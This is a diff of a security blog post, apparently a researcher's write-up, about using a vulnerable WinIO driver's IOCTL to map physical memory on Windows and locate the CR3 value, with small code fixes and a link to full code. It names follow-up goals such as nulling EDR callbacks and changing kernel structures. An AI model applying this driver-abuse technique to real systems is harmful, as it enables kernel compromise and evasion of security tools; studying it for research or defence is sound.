@@ -36,7 +36,7 @@ ULONGLONG MapMemory(HANDLE hDevice, ULONGLONG* SizeOfMapping) {
     BOOL result = DeviceIoControl(hDevice, IOCTL_WINIO_MAPPHYSTOVA, &map, sizeof(map), &map, sizeof(map), &bytesReturned, NULL);
 
     *SizeOfMapping = map.Size;
-    return mapIn.MappingAddress;
+    return map.MappingAddress;
 }
 ```
 
@@ -89,7 +89,7 @@ Once we have a mapping of physical memory we can search the pages between `0x100
 ```c
 DWORD FindCR3Value(ULONGLONG VirtualAddressBase, DWORD* cr3Page) {
     // the final stub reference is always between 0x10000 and 0x20000
-    for (DWORD page = 0x10000; pageIndex <= 0x20000; pageIndex += 0x1000) {
+    for (DWORD page = 0x10000; page <= 0x20000; page += 0x1000) {
         // CR3 value is at an offset of 0xA0
         ULONGLONG potential_cr3 = *((ULONGLONG*)((BYTE*)VirtualAddressBase + page + 0xA0));
 
@@ -98,7 +98,7 @@ DWORD FindCR3Value(ULONGLONG VirtualAddressBase, DWORD* cr3Page) {
             (potential_cr3 >> 24) == 0) {
 
             // halpLMStub reference is at an offset of 0x70
-            ULONGLONG checkHalpLMStub = *((ULONGLONG*)(BYTE*)VirtualAddressBase + page + 0x70));
+            ULONGLONG checkHalpLMStub = *((ULONGLONG*)(BYTE*)VirtualAddressBase + page + 0x70);
             if ((checkHalpLMStub & 0xfffff80000000000) == 0xfffff80000000000) {
                 *cr3Page = page;
                 return ((DWORD)potential_cr3 & 0xFFFFFFFF);
@@ -190,6 +190,10 @@ There's loads of options at this point, here's just a few:
 - Discover EDRs in physical memory and null out it's callback functions.
 - Change critical structures/pointers in the Kernel.
 
-In a future post I will take alook at some of these options. TTFN!
+In a future post I will take a look at some of these options. 
+
+The full code is [here](https://github.com/plackyhacker/plackyhacker.github.io/blob/master/code/physical-read-write-cpp).
+
+TTFN!
 
 [Home](https://plackyhacker.github.io)
